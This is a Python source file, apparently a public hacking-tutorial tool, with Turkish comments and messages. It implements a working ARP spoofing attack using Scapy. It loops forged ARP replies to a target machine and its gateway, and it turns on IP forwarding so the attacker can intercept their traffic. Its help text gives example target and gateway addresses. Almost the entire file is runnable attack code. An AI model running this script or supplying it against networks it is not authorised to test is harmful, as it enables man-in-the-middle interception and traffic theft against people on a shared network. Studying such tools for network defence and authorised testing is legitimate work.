#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time
import sys
import argparse
from termcolor import colored
import os

class ArpSpoof():

	def __init__(self):
		self.gonderilen_paket_sayisi=0
		self.about()
		self.script_desc()

	def arguman_al(self):
		parser = argparse.ArgumentParser(description=self.description,epilog=self.kullanim,prog=self.program,formatter_class=argparse.RawTextHelpFormatter)
		parser.add_argument("--hedef",dest="hedefIP",help="Hedef makine IP adresi")
		parser.add_argument("--gateway",dest="gatewayIP",help="Gateway IP adresi")
		options=parser.parse_args()
		if not options.hedefIP:
			parser.error('[-] Lütfen bir hedef belirleyiniz,daha fazla bilgi için --help kullanın.')
		elif not options.gatewayIP:
			parser.error("[-] Lütfen  gateway(varsayılan ağ gecidi) giriniz,daha fazla bilgi için --help kullanın.")
		else:
			return options

	def mac_bul(self,ip):
		arp_istek=scapy.ARP(pdst=ip)
		broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast=broadcast/arp_istek
		answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
		return answered_list[0][1].hwsrc

	
	def spoof(self,hedef_ip,gateway_ip):
		hedef_mac=self.mac_bul(hedef_ip)
		paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip)
		scapy.send(paket,verbose=False)

		
	def send_packet(self,hedefIP,gatewayIP):
		while True:
			self.spoof(hedefIP, gatewayIP)
			self.spoof(gatewayIP, hedefIP)
			self.gonderilen_paket_sayisi += 2
			print(colored("\r[+] gönderilen paket sayısı:" + str(self.gonderilen_paket_sayisi),"green")),
			sys.stdout.flush()
			time.sleep(2)

			
	def restore(self,hedef_ip,gateway_ip):
		hedef_mac=self.mac_bul(hedef_ip)
		gateway_mac=self.mac_bul(gateway_ip)
		paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip,hwsrc=gateway_mac)
		scapy.send(paket,verbose=False,count=4)

		
	def ip_forward(self,value):
		if value==1:
			os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		elif value==2:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

			
	def script_desc(self):
		self.program = "arp_spoof"
		self.kullanim ="""Kullanim: python arp_spoof.py --hedef HEDEFIP --gateway GATEWAY\nOrnek Kullanim: python arp_spoof.py --hedef 10.0.2.15 --gateway 10.0.2.1"""
		if sys.version_info[0] >= 3:
			self.description = "Aynı ağda bulunan hedef bilgisayar üzerinde ARP zehirlemesi yapmak için kullanılan bir scripttir."
		else:
			self.description = unicode("Aynı ağda bulunan hedef bilgisayar üzerinde ARP zehirlemesi yapmak için kullanılan bir scripttir.",
									   "utf8")
			self.kullanim = unicode(self.kullanim, "utf8")

			
	def about(self):
		print(colored("    _    ____  ____    ____  ____   ___   ___  _____ _____ ____  ", "green"))
		print(colored("   / \  |  _ \|  _ \  / ___||  _ \ / _ \ / _ \|  ___| ____|  _ \ ", "green"))
		print(colored("  / _ \ | |_) | |_) | \___ \| |_) | | | | | | | |_  |  _| | |_) |", "green"))
		print(colored(" / ___ \|  _ <|  __/   ___) |  __/| |_| | |_| |  _| | |___|  _ < ", "green"))
		print(colored("/_/   \_\_| \_\_|     |____/|_|    \___/ \___/|_|   |_____|_| \_ ", "green"))
		print(colored("# author      :", "green") + "Mustafa Dalga")
		print(colored("# linkedin    :", "green") + "https://www.linkedin.com/in/mustafadalga")
		print(colored("# github      :", "green") + "https://github.com/mustafadalga")
		print(colored("# title       :", "green") + "arp_spoof.py")
		print(colored("# description :", "green") + "Aynı ağda bulunan hedef bilgisayar üzerinde ARP zehirlemesi yapmak için kullanılan bir scripttir.")
		print(colored("# date        :", "green") + "22.02.2019")
		print(colored("# version     :", "green") + "1.0")
		print(colored("# ==============================================================================", "green"))


	def keyboardinterrupt_message(self):
		print(colored("\n[-] CTRL+C basıldı.ARP tablosu sıfırlanıyor... Lütfen bekleyiniz...","red"))
		print(colored("[-] Uygulamadan çıkış yapıldı!","red"))


try:
	arpSpoof=ArpSpoof()
	arpSpoof.ip_forward(1)
	options =arpSpoof.arguman_al()
	arpSpoof.send_packet(options.hedefIP, options.gatewayIP)
except KeyboardInterrupt:
	arpSpoof.keyboardinterrupt_message()
	arpSpoof.ip_forward(0)
	arpSpoof.restore(options.hedefIP,options.gatewayIP)
